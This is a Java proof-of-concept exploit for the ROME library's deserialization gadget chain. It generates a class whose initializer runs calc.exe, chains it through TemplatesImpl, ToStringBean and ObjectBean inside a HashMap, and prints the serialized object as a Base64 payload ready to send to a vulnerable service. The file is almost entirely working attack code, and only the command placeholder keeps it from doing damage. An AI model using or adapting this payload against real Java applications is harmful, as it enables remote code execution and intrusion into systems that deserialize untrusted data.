package ROME;

import com.sun.syndication.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.syndication.feed.impl.ObjectBean;
import com.sun.syndication.feed.impl.ToStringBean;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;

import javax.xml.transform.Templates;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;


public class rome {
    public static byte[] expClass() throws Exception{
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass = pool.makeClass("i");
        CtClass superClass = pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        ctClass.setSuperclass(superClass);
        CtConstructor constructor = ctClass.makeClassInitializer();
        constructor.setBody("Runtime.getRuntime().exec(\"calc.exe\");");
        return ctClass.toBytecode();
    }

    public static void main(String[] args) throws Exception{

        byte[] bytes = expClass();

        TemplatesImpl templatesImpl = new TemplatesImpl();
        setFieldValue(templatesImpl, "_bytecodes", new byte[][]{bytes});
        setFieldValue(templatesImpl, "_name", "a");
        setFieldValue(templatesImpl, "_tfactory", null);

        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesImpl);
        ObjectBean objectBean = new ObjectBean(ToStringBean.class, toStringBean);
        Map hashMap = new HashMap();
        hashMap.put(objectBean, "x");

        setFieldValue(objectBean, "_cloneableBean", null);
        setFieldValue(objectBean, "_toStringBean", null);

        // 执行序列化与反序列化，并且返回序列化数据
        ByteArrayOutputStream bs = unSerial(hashMap);
        // 输出序列化的Base64编码字符
        Base64Encode(bs);
    }

    private static ByteArrayOutputStream unSerial(Map hashMap) throws Exception{
        ByteArrayOutputStream bs = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(bs);
        out.writeObject(hashMap);
        ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bs.toByteArray()));
        in.readObject();
        in.close();
        return bs;
    }
    private static void Base64Encode(ByteArrayOutputStream bs){
        byte[] encode = Base64.getEncoder().encode(bs.toByteArray());
        String s = new String(encode);
        System.out.println(s);
        System.out.println(s.length());
    }
    private static void setFieldValue(Object obj, String field, Object arg) throws Exception{
        Field f = obj.getClass().getDeclaredField(field);
        f.setAccessible(true);
        f.set(obj, arg);
    }
}
